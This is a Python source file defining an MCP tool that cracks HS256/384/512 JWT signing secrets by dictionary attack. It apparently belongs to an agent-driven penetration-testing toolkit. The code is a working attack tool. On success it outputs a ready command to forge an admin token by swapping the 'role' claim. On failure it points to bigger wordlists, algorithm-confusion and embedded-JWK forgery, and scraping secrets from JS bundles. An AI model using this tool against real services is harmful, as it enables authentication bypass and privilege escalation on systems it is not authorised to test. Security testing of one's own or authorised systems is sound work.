"""crack_jwt_secret — HS256/384/512 dictionary attack with built-in wordlist.

Pure compute, no HTTP. Iterates a wordlist against the token's signature
using constant-time HMAC compare. Aborts on first match.

Built-in wordlist covers ~250 of the most common default secrets (framework
defaults, tutorial placeholders, single-word + year combos). For deeper
cracks, operator passes wordlist_path. For online cracking against an
endpoint that accepts tokens, use forge_jwt + curl_request loop.
"""

from __future__ import annotations

import asyncio
import os
import time
from typing import Iterable

from mcp.server.fastmcp import FastMCP

from ._jwt_codec import decode_header, decode_payload, split_jwt, verify_hmac
from ._jwt_wordlist import JWT_DEFAULT_WORDLIST


_SUPPORTED_HS = ("HS256", "HS384", "HS512")


def _iter_wordlist(path: str | None) -> Iterable[str]:
    """Yield from built-in list, then operator file if supplied. Built-in is
    fast-path; file (potentially MB-sized) is streamed line-by-line so memory
    stays bounded."""
    yield from JWT_DEFAULT_WORDLIST
    if not path:
        return
    if not os.path.isfile(path):
        return
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            yield line.rstrip("\n").rstrip("\r")


def _crack_sync(
    token: str, alg: str, wordlist_path: str | None, max_candidates: int,
) -> tuple[str | None, int, float]:
    """Run the crack in a sync function so it can be off-loaded via
    asyncio.to_thread without blocking the event loop. Returns
    (secret_or_None, tries, elapsed_s)."""
    start = time.monotonic()
    tries = 0
    for candidate in _iter_wordlist(wordlist_path):
        tries += 1
        if tries > max_candidates:
            break
        try:
            if verify_hmac(alg, token, candidate.encode()):
                return candidate, tries, time.monotonic() - start
        except Exception:
            # Malformed candidate (encoding edge) — skip, don't abort the run.
            continue
    return None, tries, time.monotonic() - start


def register(mcp: FastMCP):

    @mcp.tool()
    async def crack_jwt_secret(
        token: str,
        wordlist_path: str = "",
        max_candidates: int = 50000,
    ) -> str:
        """Dictionary attack against an HS256/384/512 JWT signature.

        Returns the secret if found, plus a follow-up forge command. Aborts
        at max_candidates to keep the run bounded — pass wordlist_path for
        deeper attacks (rockyou, fast-jwt-secrets, custom).

        Args:
            token: HS-signed JWT (header.payload.signature)
            wordlist_path: Optional path to a newline-separated wordlist file
            max_candidates: Stop after this many tries (default 50000)
        """
        try:
            split_jwt(token)
        except ValueError as e:
            return f"Error: {e}"

        try:
            header = decode_header(token)
        except Exception as e:
            return f"Error decoding header: {e}"

        alg = (header.get("alg") or "").upper()
        if alg not in _SUPPORTED_HS:
            return (
                f"Error: alg={alg!r} is not HS256/HS384/HS512 — dictionary attack "
                f"only applies to HMAC algorithms. For RS* tokens use forge_jwt "
                f"with mode=hs_confusion (if you have the public key) or jwk_embed "
                f"(if the server accepts embedded jwk)."
            )

        secret, tries, elapsed = await asyncio.to_thread(
            _crack_sync, token, alg, wordlist_path or None, max_candidates,
        )

        lines = [
            f"crack_jwt_secret ({alg}): {tries} candidates in {elapsed*1000:.1f}ms",
        ]
        if secret is not None:
            payload = decode_payload(token)
            sample_claims = {k: payload[k] for k in
                             ("sub", "role", "admin", "iss", "aud", "exp")
                             if k in payload}
            lines.extend([
                "",
                f"CRACKED — secret: {secret!r}",
                "",
                "Sample claims (forge candidates):",
                f"  {sample_claims}",
                "",
                "Forge admin token now:",
                f"  forge_jwt(token=<original>, mode='claim_swap', "
                f"claim_changes={{'role': 'admin'}}, hmac_secret='{secret}')",
            ])
        else:
            lines.extend([
                "",
                "Not cracked with built-in wordlist.",
                "Next step: pass wordlist_path to a deeper list:",
                "  - https://github.com/wallarm/jwt-secrets",
                "  - rockyou.txt (trim to <8 chars first to stay <30s)",
                "If still no hit, the secret is likely strong — try alg_confusion",
                "or hunt for the secret in JS bundles via extract_js_secrets.",
            ])
        return "\n".join(lines)
